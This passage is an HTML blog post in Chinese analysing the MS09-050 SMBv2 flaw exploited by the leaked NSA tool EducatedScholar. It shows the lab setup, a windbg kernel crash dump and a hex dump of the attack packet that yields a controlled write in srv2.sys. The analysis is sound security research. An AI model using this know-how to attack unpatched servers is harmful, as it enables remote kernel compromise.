@@ -1,0 +1,1099 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next muse" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="漏洞分析,nsa工具,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="giantbranch's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="环境搭建 到msdn I tell you下载完镜像安装完，ping 2008ping不通，但它ping外面却可以，后来发现是默认开启了防火墙，把防火墙关闭了就好 之后是漏洞利用不成功，原来还要安装域控  实验环境及工具如下：  2008 sp1 datacenter （装了域控）windbgVirtualKD-3.0wireshark  尝试分析一开始简单了解了一下smb协议，尝试抓取攻击包，看">
+<meta name="keywords" content="漏洞分析,nsa工具">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Educatedscholar利用的漏洞ms09-050分析及其利用的shellcode分析及与msf利用对比">
+<meta property="og:url" content="https://www.giantbranch.cn/2017/08/26/Educatedscholar利用的漏洞ms09-050分析及其利用的shellcode分析及与msf利用对比/index.html">
+<meta property="og:site_name" content="giantbranch&#39;s blog">
+<meta property="og:description" content="环境搭建 到msdn I tell you下载完镜像安装完，ping 2008ping不通，但它ping外面却可以，后来发现是默认开启了防火墙，把防火墙关闭了就好 之后是漏洞利用不成功，原来还要安装域控  实验环境及工具如下：  2008 sp1 datacenter （装了域控）windbgVirtualKD-3.0wireshark  尝试分析一开始简单了解了一下smb协议，尝试抓取攻击包，看">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503974094851.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503974253251.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503974330638.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503976601899.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503976723860.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503987825905.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1504228019984.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1504228065144.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503909773193.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503992118894.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503988843352.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503988962590.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503988983777.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503989042114.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503989303596.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503989359410.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503989470040.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503989506664.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503989630145.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503989750765.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503989843803.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503989998649.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503990033795.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503992118894.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503992828433.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503911314234.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503911456518.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503993305829.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503994118901.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503995339000.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503995387570.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503995521911.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503996385800.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1503998000920.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1504080281135.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1504080316813.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1504080657731.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1504080803381.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1504081322701.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/1504081460689.jpg">
+<meta property="og:updated_time" content="2023-10-13T13:14:33.054Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Educatedscholar利用的漏洞ms09-050分析及其利用的shellcode分析及与msf利用对比">
+<meta name="twitter:description" content="环境搭建 到msdn I tell you下载完镜像安装完，ping 2008ping不通，但它ping外面却可以，后来发现是默认开启了防火墙，把防火墙关闭了就好 之后是漏洞利用不成功，原来还要安装域控  实验环境及工具如下：  2008 sp1 datacenter （装了域控）windbgVirtualKD-3.0wireshark  尝试分析一开始简单了解了一下smb协议，尝试抓取攻击包，看">
+<meta name="twitter:image" content="http://pic.giantbranch.cn/1503974094851.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.giantbranch.cn/2017/08/26/Educatedscholar利用的漏洞ms09-050分析及其利用的shellcode分析及与msf利用对比/">
+
+
+
+
+
+  <title>Educatedscholar利用的漏洞ms09-050分析及其利用的shellcode分析及与msf利用对比 | giantbranch's blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-121265336-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?e3a097ddc6964e154e65d478725ac9ed";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">giantbranch's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">忘掉掌声，按自己的方式，继续前行，跑过一生</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-book">
+          <a href="/book/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            读过的书
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.giantbranch.cn/2017/08/26/Educatedscholar利用的漏洞ms09-050分析及其利用的shellcode分析及与msf利用对比/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="giantbranch">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giantbranch's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">Educatedscholar利用的漏洞ms09-050分析及其利用的shellcode分析及与msf利用对比</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-26T00:00:00+00:00">
+                2017-08-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/08/26/Educatedscholar利用的漏洞ms09-050分析及其利用的shellcode分析及与msf利用对比/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/08/26/Educatedscholar利用的漏洞ms09-050分析及其利用的shellcode分析及与msf利用对比/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ol>
+<li>到msdn I tell you下载完镜像安装完，ping 2008ping不通，但它ping外面却可以，后来发现是默认开启了防火墙，把防火墙关闭了就好</li>
+<li>之后是漏洞利用不成功，原来还要安装域控</li>
+</ol>
+<p>实验环境及工具如下：</p>
+<blockquote>
+<p>2008 sp1 datacenter （装了域控）<br>windbg<br>VirtualKD-3.0<br>wireshark</p>
+</blockquote>
+<h1 id="尝试分析"><a href="#尝试分析" class="headerlink" title="尝试分析"></a>尝试分析</h1><p>一开始简单了解了一下smb协议，尝试抓取攻击包，看了一下，也看不出什么</p>
+<p>于是就修改里面配置文件的返回地址什么的东西为0x41414141，马上发第一个包就崩溃了<br>(一开始直接下断还断不下来，可能是因为那里初始的时候还不是代码)</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !analyze -v</span><br><span class="line">*******************************************************************************</span><br><span class="line">*                                                                             *</span><br><span class="line">*                        Bugcheck Analysis                                    *</span><br><span class="line">*                                                                             *</span><br><span class="line">*******************************************************************************</span><br><span class="line"></span><br><span class="line">SYSTEM_THREAD_EXCEPTION_NOT_HANDLED (7e)</span><br><span class="line">This is a very <span class="meta">common</span> bugcheck.  Usually the exception address pinpoints</span><br><span class="line">the driver/function that caused the problem.  Always note this address</span><br><span class="line">as well as the link date of the driver/image that contains this address.</span><br><span class="line"><span class="symbol">Arguments:</span></span><br><span class="line"><span class="symbol">Arg1:</span> c0000005, The exception code that was <span class="keyword">not</span> handled</span><br><span class="line"><span class="symbol">Arg2:</span> 80fcb986, The address that the exception occurred <span class="meta">at</span></span><br><span class="line"><span class="symbol">Arg3:</span> 9aef6c54, Exception Record Address</span><br><span class="line"><span class="symbol">Arg4:</span> 9aef6950, Context Record Address</span><br><span class="line"></span><br><span class="line">Debugging Details:</span><br><span class="line">------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="symbol">EXCEPTION_CODE:</span> (NTSTATUS) <span class="number">0xc0000005</span> - 0x%p</span><br><span class="line"></span><br><span class="line"><span class="symbol">FAULTING_IP:</span> </span><br><span class="line">srv2!SrvConsumeDataAndComplete+b</span><br><span class="line">80fcb986 <span class="number">83611800</span>        <span class="keyword">and</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">18h</span>],<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">EXCEPTION_RECORD:</span>  9aef6c54 -- (.exr <span class="number">0xffffffff9aef6c54</span>)</span><br><span class="line"><span class="symbol">ExceptionAddress:</span> 80fcb986 (srv2!SrvConsumeDataAndComplete+<span class="number">0x0000000b</span>)</span><br><span class="line"><span class="symbol">   ExceptionCode:</span> c0000005 (Access violation)</span><br><span class="line"><span class="symbol">  ExceptionFlags:</span> <span class="number">00000000</span></span><br><span class="line"><span class="symbol">NumberParameters:</span> <span class="number">2</span></span><br><span class="line">   Parameter[<span class="number">0</span>]: <span class="number">00000001</span></span><br><span class="line">   Parameter[<span class="number">1</span>]: <span class="number">41414141</span></span><br><span class="line">Attempt to write to address <span class="number">41414141</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">CONTEXT:</span>  9aef6950 -- (.cxr <span class="number">0xffffffff9aef6950</span>)</span><br><span class="line"><span class="built_in">eax</span>=9d9785d0 <span class="built_in">ebx</span>=9d97b1a8 <span class="built_in">ecx</span>=<span class="number">41414129</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=9d9785d0 <span class="built_in">edi</span>=8c9cb5a4</span><br><span class="line"><span class="built_in">eip</span>=80fcb986 <span class="built_in">esp</span>=9aef6d1c <span class="built_in">ebp</span>=9aef6d1c iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">0008</span>  <span class="built_in">ss</span>=<span class="number">0010</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=<span class="number">0030</span>  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010246</span></span><br><span class="line">srv2!SrvConsumeDataAndComplete+<span class="number">0xb</span>:</span><br><span class="line">80fcb986 <span class="number">83611800</span>        <span class="keyword">and</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">18h</span>],<span class="number">0</span> <span class="built_in">ds</span>:<span class="number">0023</span>:<span class="number">41414141</span>=????????</span><br><span class="line">Resetting <span class="meta">default</span> scope</span><br><span class="line"></span><br><span class="line"><span class="symbol">DEFAULT_BUCKET_ID:</span>  STRING_DEREFERENCE</span><br><span class="line"></span><br><span class="line"><span class="symbol">PROCESS_NAME:</span>  System</span><br><span class="line"></span><br><span class="line"><span class="symbol">CURRENT_IRQL:</span>  <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">ERROR_CODE:</span> (NTSTATUS) <span class="number">0xc0000005</span> - 0x%p</span><br><span class="line"></span><br><span class="line"><span class="symbol">EXCEPTION_PARAMETER1:</span>  <span class="number">00000001</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">EXCEPTION_PARAMETER2:</span>  <span class="number">41414141</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">WRITE_ADDRESS:</span>  <span class="number">41414141</span> </span><br><span class="line"></span><br><span class="line"><span class="symbol">FOLLOWUP_IP:</span> </span><br><span class="line">srv2!SrvConsumeDataAndComplete+b</span><br><span class="line">80fcb986 <span class="number">83611800</span>        <span class="keyword">and</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">18h</span>],<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">BUGCHECK_STR:</span>  <span class="number">0x7E</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">LAST_CONTROL_TRANSFER:</span>  from 80fcaae2 to 80fcb986</span><br><span class="line"></span><br><span class="line"><span class="symbol">STACK_TEXT:</span>  </span><br><span class="line">9aef6d1c 80fcaae2 9d9785d0 9d9785d0 80fc8800 srv2!SrvConsumeDataAndComplete+<span class="number">0xb</span></span><br><span class="line">9aef6d34 80fcaab4 9d9785d0 81b0f110 80fc8800 srv2!SrvProcCompleteRequest+<span class="number">0x23</span></span><br><span class="line">9aef6d50 80fc919f 9d97b008 <span class="number">00000000</span> 8c599ac0 srv2!SrvProcessPacket+<span class="number">0x88</span></span><br><span class="line">9aef6d7c 81be2a1c 8ada8bd0 1119f9b9 <span class="number">00000000</span> srv2!SrvProcWorkerThread+<span class="number">0x19a</span></span><br><span class="line">9aef6dc0 81a3ba3e 80fc9005 8ada8b78 <span class="number">00000000</span> nt!PspSystemThreadStartup+<span class="number">0x9d</span></span><br><span class="line"><span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> nt!KiThreadStartup+<span class="number">0x16</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="symbol">SYMBOL_STACK_INDEX:</span>  <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">SYMBOL_NAME:</span>  srv2!SrvConsumeDataAndComplete+b</span><br><span class="line"></span><br><span class="line"><span class="symbol">FOLLOWUP_NAME:</span>  MachineOwner</span><br><span class="line"></span><br><span class="line"><span class="symbol">MODULE_NAME:</span> srv2</span><br><span class="line"></span><br><span class="line"><span class="symbol">IMAGE_NAME:</span>  srv2.sys</span><br><span class="line"></span><br><span class="line"><span class="symbol">DEBUG_FLR_IMAGE_TIMESTAMP:</span>  47918<span class="keyword">aaa</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">STACK_COMMAND:</span>  .cxr <span class="number">0xffffffff9aef6950</span> <span class="comment">; kb</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">FAILURE_BUCKET_ID:</span>  0x7E_srv2!SrvConsumeDataAndComplete+b</span><br><span class="line"></span><br><span class="line"><span class="symbol">BUCKET_ID:</span>  0x7E_srv2!SrvConsumeDataAndComplete+b</span><br><span class="line"></span><br><span class="line"><span class="symbol">Followup:</span> MachineOwner</span><br><span class="line">---------</span><br><span class="line"></span><br><span class="line">kd&gt; <span class="built_in">dd</span> <span class="number">0xffdf0908</span></span><br><span class="line">ffdf0908  00c35646 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">ffdf0918  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">ffdf0928  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">ffdf0938  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">ffdf0948  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">ffdf0958  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">ffdf0968  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">ffdf0978  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br></pre></td></tr></table></figure>
+
+<p>后来就在这个崩溃的函数下断点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; bp srv2!SrvConsumeDataAndComplete</span><br><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">srv2!SrvConsumeDataAndComplete:</span><br><span class="line">97dc997b 8bff            mov     edi,edi</span><br><span class="line">kd&gt; kv</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">9715cd1c 97dc8ae2 8c6b0d10 8c6b0d10 97dc7300 srv2!SrvConsumeDataAndComplete (FPO: [Non-Fpo])</span><br><span class="line">9715cd34 97dc8ab4 8c6b0d10 81b0e110 97dc7300 srv2!SrvProcCompleteRequest+0x23 (FPO: [Non-Fpo])</span><br><span class="line">9715cd50 97dc719f 8c69c958 00000000 8bc6d020 srv2!SrvProcessPacket+0x88 (FPO: [Non-Fpo])</span><br><span class="line">9715cd7c 81be1a1c 8add3cf8 a6838496 00000000 srv2!SrvProcWorkerThread+0x19a (FPO: [Non-Fpo])</span><br><span class="line">9715cdc0 81a3aa3e 97dc7005 8add3ca0 00000000 nt!PspSystemThreadStartup+0x9d</span><br><span class="line">00000000 00000000 00000000 00000000 00000000 nt!KiThreadStartup+0x16</span><br><span class="line">kd&gt; dd esp</span><br><span class="line">9aaacd20  97dc8ae2 8c6b0d10 8c6b0d10 97dc7300</span><br><span class="line">9aaacd30  97dc7300 9aaacd50 97dc8ab4 8c6b0d10</span><br><span class="line">9aaacd40  81b0e110 97dc7300 8add3ca0 8c5c8bf0</span><br><span class="line">9aaacd50  9aaacd7c 97dc719f 8c5c8bf0 00000000</span><br><span class="line">9aaacd60  8abe18c8 00000000 00000000 00000000</span><br><span class="line">9aaacd70  9aaacd80 00000006 00000006 9aaacdc0</span><br><span class="line">9aaacd80  81be1a1c 8add3cf8 ab3c8496 00000000</span><br><span class="line">9aaacd90  00000000 00000000 00000001 00000023</span><br><span class="line">kd&gt; dc 8c6b0d10 l60</span><br><span class="line">8c6b0d10  424d53ff 00000072 c8531800 000001bb  .SMBr.....S.....</span><br><span class="line">8c6b0d20  00000000 00000000 00000000 00000000  ................</span><br><span class="line">8c6b0d30  02014900 30356843 51463759 53575175  .I..Ch50Y7FQuQWS</span><br><span class="line">8c6b0d40  454c737a 58566272 72626d47 41414129  zsLErbVXGmbr)AAA</span><br><span class="line">8c6b0d50  5666474d 66734b58 58694138 64684b44  MGfVXKsf8AiXDKhd</span><br><span class="line">8c6b0d60  336d7338 44453063 3733394e 74437761  8sm3c0EDN937awCt</span><br><span class="line">8c6b0d70  354f7452 424a7946 6c736f59 70663465  RtO5FyJBYosle4fp</span><br><span class="line">8c6b0d80  ffdf02f4 ffdf02f4 ffdf02f4 34356576  ............ve54</span><br><span class="line">8c6b0d90  7a317978 37444133 4d530200 2e322042  xy1z3AD7..SMB 2.</span><br><span class="line">8c6b0da0  00323030 00000000 00000000 00000002  002.............</span><br><span class="line">8c6b0db0  00000001 00000000 41414089 41414085  .........@AA.@AA</span><br><span class="line">8c6b0dc0  00000000 00000000 00000000 00000000  ................</span><br><span class="line">8c6b0dd0  00000000 00000000 00000000 00000000  ................</span><br><span class="line">8c6b0de0  00000000 00000000 00000000 00000000  ................</span><br><span class="line">8c6b0df0  00000004 00000000 00000000 00000000  ................</span><br><span class="line">8c6b0e00  00000000 00000000 00000000 00000000  ................</span><br><span class="line">8c6b0e10  00000000 00000000 00000000 00000000  ................</span><br><span class="line">8c6b0e20  00000000 00000000 00000000 00000000  ................</span><br><span class="line">8c6b0e30  00000000 00000000 ffffffff 7fffffff  ................</span><br><span class="line">8c6b0e40  00000000 00000000 00000000 00000000  ................</span><br><span class="line">8c6b0e50  00000000 00000000 00000000 3fffffe6  ...............?</span><br><span class="line">8c6b0e60  00000001 00000000 00000000 00000000  ................</span><br><span class="line">8c6b0e70  00000000 00000000 00000000 00000000  ................</span><br><span class="line">8c6b0e80  00000000 00000000 00000000 00000000  ................</span><br></pre></td></tr></table></figure>
+
+<p>发现这参数正是客户端发送的smb数据，而异常是获取smb数据+0x3c的数值作为地址+0x18后无法读取的异常<br>这里的41414129应该是我们设置的值减了0x18后发送过来的</p>
